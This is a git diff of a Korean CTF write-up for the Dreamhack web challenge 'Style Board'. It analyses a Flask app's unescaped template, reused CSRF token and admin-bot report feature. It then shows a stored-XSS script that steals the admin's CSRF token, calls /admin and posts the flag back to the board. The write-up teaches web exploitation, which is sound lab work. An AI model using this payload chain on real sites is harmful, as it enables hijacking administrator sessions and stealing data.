@@ -2,48 +2,62 @@
 
 ## 1. 문제 개요
 
-* **문제 링크:** 
+* **문제 링크:** [Dreamhack CTF - Style Board](https://dreamhack.io/wargame/challenges/3162)
+(Dreamhack CTF Season 8 Round #6 출제)
 
-* **티어:** 
+* **티어:** Silver 2
 
 * **분야:** Web
 
 * **목표:** CSRF 토큰 노출 및 Stored XSS를 결합한 관리자 봇 세션 탈취를 통한 flag 획득
 
 ## 2. 취약점 분석
-제공된 `app.py`, `view_post.html`, `mypage.html` 분석 결과, 세 가지 결함이 결합되어 단일 공격 체인을 형성함을 확인.
+제공된 `app.py`, `view_post.html`, `mypage.html` 분석 결과, 여러 결함이 결합되어 단일 공격 체인을 형성함을 확인.
 
-`view_post.html`은 다른 템플릿과 달리 `{% autoescape false %}`로 Jinja2의 기본 이스케이핑을 명시적으로 해제한 구조로 확인, 게시글 `content` 필드에 저장된 값이 이스케이프 없이 그대로 응답에 삽입되어 Stored XSS가 성립함.
-
-```jinja-html
-{# [view_post.html] autoescape 명시적 해제 - Stored XSS 발생 지점 #}
-{% autoescape false %}
-{{ post.content }}
-{% endautoescape %}
-```
-
-`get_token()` 함수가 엔드포인트 구분 없이 유저별 단일 CSRF 토큰을 발급하고 재사용하는 구조로 확인, `board_write`, `style`, `mypage`, `admin` 전 라우트가 동일한 토큰을 검증에 사용함.
+`/admin` 라우트가 flag를 반환하는 sink로 확인, `session["is_admin"]`과 `get_token("admin")` 값 일치라는 두 조건을 통과해야 함.
 
 ```python
-# [app.py] CSRF 토큰 발급 - 엔드포인트 구분 없이 유저당 1개만 고정 발급
-def get_token(username):
-    token = token_storage.get(username)
-    if token == None:
-        token = generate_token(username)
-    return token
+# [app.py] /admin - flag 반환 조건: is_admin 세션 + csrf-token 일치
+@app.route("/admin", methods=["POST"])
+def admin_page():
+    if "user" not in session:
+        return redirect(url_for("login"))
+    if session.get("is_admin") == False or request.form.get("csrf-token") != get_token("admin"):
+        return {"code": 403, "message": "Access Denined"}
+    return {"code": 200, "flag": FLAG}
 ```
 
-`mypage.html`의 hidden input에 세션 소유자의 CSRF 토큰이 값 그대로 노출되는 구조로 확인, 관리자 봇이 이 페이지를 방문하면 응답 body에서 admin의 토큰을 그대로 추출 가능함.
-
-```jinja-html
-{# [mypage.html] admin 세션 방문 시 admin의 CSRF 토큰이 hidden input에 노출 #}
-<input type="hidden" id="csrf-token" name="csrf-token" value="{{ csrf_token }}" required>
-```
-
-`check_url()` 함수가 `Promise().then()` 체인을 사용하나 Python은 인자를 즉시 평가하는 언어라 실질적으로 동기 순차 실행되는 구조로 확인, admin 계정 로그인 후 지정된 URL로 이동하는 흐름이 그대로 보장됨. 이 함수는 `True`/`False`만 반환하고 봇이 방문한 페이지의 응답 내용은 반환하지 않는 구조로 확인, 즉 `/report`를 통한 임의 URL 직접 조회로는 결과 확인이 불가능함.
+`is_admin` 세션은 `login()`에서 `username in users`와 비밀번호 일치 시에만 `True`로 설정되는 구조로 확인, `users["admin"]`이 서버 시작 시 생성되는 `app.secret_key`의 해시값이라 매 실행마다 랜덤하게 바뀌어 직접 로그인이 불가능함.
 
 ```python
-# [app.py] check_url() - Promise 패턴이지만 인자 즉시 평가로 사실상 동기 실행, 응답 내용 미반환
+# [app.py] login() - is_admin=True 설정 조건
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        # ... (중략) ...
+        elif username in users and users[username] == password:
+            session["user"] = username
+            session["is_admin"] = True
+            return redirect(url_for("board"))
+        session["user"] = username
+        session["is_admin"] = False
+        return redirect(url_for("board"))
+    return render_template("login.html")
+```
+
+```python
+# [app.py] admin 비밀번호 - 런타임 시크릿 키 해시로 고정, 직접 로그인 불가
+users = {
+    "admin": hashlib.sha256(app.secret_key).hexdigest()
+}
+```
+
+직접 로그인이 불가능해, admin 계정으로 실제 /login 요청을 통해 로그인을 수행하는 다른 주체를 확인. `check_url()` 함수가 `Promise().then()` 체인을 사용하나 Python은 인자를 즉시 평가하는 언어라 실질적으로 동기 순차 실행되는 구조로 확인, admin 계정 로그인 후 지정된 URL로 이동하는 흐름이 그대로 보장됨.
+
+```python
+# [app.py] check_url() - Promise 패턴이지만 인자 즉시 평가로 사실상 동기 실행
 def check_url(url):
     # ... (중략) ...
     driver_promise = Promise(driver.get("http://127.0.0.1:8000/login"))
@@ -54,7 +68,68 @@ def check_url(url):
     driver_promise.then(driver.get(url))
 ```
 
-* **분석 결론:** `/admin` sink의 두 조건(`is_admin` 세션, `csrf-token` 일치)을 기준으로 역추적한 결과, `is_admin`은 admin 비밀번호가 런타임 랜덤(`app.secret_key` 해시)이라 직접 충족이 불가능해 `check_url()`의 대리 로그인 경로가 필요했고, `csrf-token`은 `get_token()` 호출부 전수 조사로 노출 라우트(`mypage`, `style`, `board_write`)를 특정했으나 `check_url()`이 응답 내용을 반환하지 않아 직접 조회가 불가능함을 확인, 이에 따라 봇 브라우저 내부에서 값을 읽고 우리가 접근 가능한 공유 저장소(`posts`)로 반출하는 XSS 체인이 요구됨을 판단함. `autoescape false`로 인한 Stored XSS, 엔드포인트 무관 고정 CSRF 토큰, `/mypage`를 통한 admin 토큰 노출이 결합되어, 일반 사용자가 작성한 게시글을 `/report`로 신고하면 admin 세션의 브라우저에서 XSS가 실행되고, 그 안에서 admin의 CSRF 토큰을 탈취해 `/admin` 엔드포인트를 호출, flag를 획득 가능한 구조로 확인.
+`check_url()`을 호출하는 진입점은 `/report`로 확인, `path` 파라미터를 받아 별도 검증 없이 내부 URL로 조합해 그대로 전달하는 구조임. 이로써 `is_admin` 조건은 `/report`에 원하는 경로를 지정해 봇을 그 경로로 유도하는 방식으로 충족 가능함을 확인.
+
+```python
+# [app.py] /report - check_url() 호출 진입점, path를 검증 없이 URL로 조합
+@app.route("/report", methods=["GET", "POST"])
+def report():
+    if "user" not in session:
+        return redirect(url_for("login"))
+    if request.method == "POST":
+        path = request.form.get("path")
+        if path and path[0] == "/":
+            path = path[1:]
+        url = f"http://127.0.0.1:8000/{path}"
+        if check_url(url):
+            return '''<script>alert("Success");history.go(-1);</script>'''
+        else:
+            return '''<script>alert("Fail");history.go(-1);</script>'''
+    return render_template("report.html")
+```
+
+두 번째 조건인 `csrf-token`을 확인하기 위해 `get_token()` 호출부를 전수 조사, 엔드포인트 구분 없이 유저별 단일 토큰을 발급하고 재사용하는 구조로 확인, `board_write`, `style`, `mypage`, `admin` 전 라우트가 동일한 토큰을 검증에 사용함.
+
+```python
+# [app.py] CSRF 토큰 발급 - 엔드포인트 구분 없이 유저당 1개만 고정 발급
+def get_token(username):
+    token = token_storage.get(username)
+    if token == None:
+        token = generate_token(username)
+    return token
+```
+
+`get_token()` 호출부 중 `mypage.html`의 hidden input에 세션 소유자의 CSRF 토큰이 값 그대로 노출되는 구조로 확인, 관리자 봇이 이 페이지를 방문하면 응답 body에서 admin의 토큰을 그대로 추출 가능함.
+
+```jinja-html
+{# [mypage.html] admin 세션 방문 시 admin의 CSRF 토큰이 hidden input에 노출 #}
+<input type="hidden" id="csrf-token" name="csrf-token" value="{{ csrf_token }}" required>
+```
+
+다만 `check_url()`은 `True`/`False`만 반환하고 봇이 방문한 페이지의 응답 내용은 반환하지 않는 구조로 확인, 즉 `/report`를 통한 임의 URL 직접 조회로는 mypage 응답을 직접 확인할 수 없음. 이 값을 확인하려면 봇 브라우저 내부에서 코드가 실행돼야 함을 판단, `view_post()`가 `GET /board/<id>` 요청 시 `posts`에서 해당 게시글을 찾아 `view_post.html`을 렌더링하는 구조로 확인.
+
+```python
+# [app.py] view_post() - GET /board/<id>, view_post.html 렌더링 진입점
+@app.route("/board/<int:post_id>")
+def view_post(post_id):
+    if "user" not in session:
+        return redirect(url_for("login"))
+    post = next((p for p in posts if p["id"] == post_id), None)
+    if not post:
+        return {"code": 404, "message": "Not Found"}
+    return render_template("view_post.html", post=post)
+```
+
+`view_post.html`은 다른 템플릿과 달리 `{% autoescape false %}`로 Jinja2의 기본 이스케이핑을 명시적으로 해제한 구조로 확인, 게시글 `content` 필드에 저장된 값이 이스케이프 없이 그대로 응답에 삽입되어 Stored XSS가 성립함.
+
+```jinja-html
+{# [view_post.html] autoescape 명시적 해제 - Stored XSS 발생 지점 #}
+{% autoescape false %}
+{{ post.content }}
+{% endautoescape %}
+```
+
+* **분석 결론:** `/admin` sink의 두 조건을 역추적한 결과, `is_admin`은 admin 비밀번호가 런타임 랜덤(`app.secret_key` 해시)이라 직접 충족이 불가능해 `check_url()`의 대리 로그인 경로가 필요했고, 이는 `/report`에 원하는 경로를 지정하는 방식으로 유도 가능함을 확인. `csrf-token`은 `mypage.html`에서 노출되나 `check_url()`이 응답 내용을 반환하지 않아 직접 조회가 불가능함을 확인, 이에 따라 봇 브라우저 내부에서 값을 읽고 우리가 접근 가능한 공유 저장소(`posts`)로 반출하는 XSS 체인이 요구됨을 판단했고, `view_post.html`의 `autoescape false` 구조가 그 실행 지점으로 확인됨. 종합하면, 일반 사용자가 작성한 게시글을 `/report`로 신고하면 admin 세션의 브라우저에서 XSS가 실행되고, 그 안에서 admin의 CSRF 토큰을 탈취해 `/admin` 엔드포인트를 호출, flag를 획득 가능한 구조로 확인.
 
 ## 3. 공격 수행
 payload는 `/board/write` 제출 시점엔 `posts`(전역 게시글 리스트)에 문자열로 저장만 되며 실행되지 않고, 이후 `/report`로 유도된 봇이 `GET /board/<id>`(view_post)를 열람해 응답 HTML을 파싱하는 시점에 비로소 봇의 브라우저에서 실행됨.
@@ -72,13 +147,14 @@ fetch('/mypage')
       method: 'POST',
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: 'csrf-token=' + encodeURIComponent(token)
-    }).then(r => r.json()).then(d => ({token, flag: d.flag}));
-  })
-  .then(({token, flag}) => {
-    return fetch('/board/write', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      body: 'title=leak&content=' + encodeURIComponent(flag) + '&csrf-token=' + encodeURIComponent(token)
+    }).then(r => r.json())
+      .then(d => {
+      const flag = d.flag;
+      return fetch('/board/write', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'title=leak&content=' + encodeURIComponent(flag) + '&csrf-token=' + encodeURIComponent(token)
+      });
     });
   });
 </script>
@@ -86,11 +162,11 @@ fetch('/mypage')
 
 ![Write Post 화면 - payload 입력](./images/01-write_post.png)
 
-2. Burp Suite HTTP History에서 저장된 게시글(`GET /board/2`) 요청을 확인, Response Raw 탭에서 스크립트 태그가 이스케이프 없이 그대로 반영됨을 확인해 `autoescape false` 구조를 wire 레벨에서 검증.
+2. Burp Suite HTTP History에서 저장된 게시글(`GET /board/2`) 요청을 확인, Response Raw 탭에서 스크립트 태그가 이스케이프 없이 그대로 반영됨을 확인해 게시글이 id=2로 정상 저장됐음과 `autoescape false` 구조를 wire 레벨에서 동시에 검증.
 
 ![Burp Raw Response - autoescape 미적용으로 script 태그 그대로 노출](./images/02-burp_script.png)
 
-3. 3. `check_url()`의 봇 유도 경로를 이용해 `/report`에 `path=board/2` 제출, 관리자 봇이 admin 세션으로 해당 게시글을 열람해 XSS가 실행됨을 Success alert로 확인.
+3. `check_url()`의 봇 유도 경로를 이용해 `/report`에 `path=board/2` 제출, 관리자 봇이 admin 세션으로 해당 게시글을 열람해 XSS가 실행됨을 Success alert로 확인.
 
 ![Report 제출 후 Success alert 확인](./images/03-report_success.png)
 
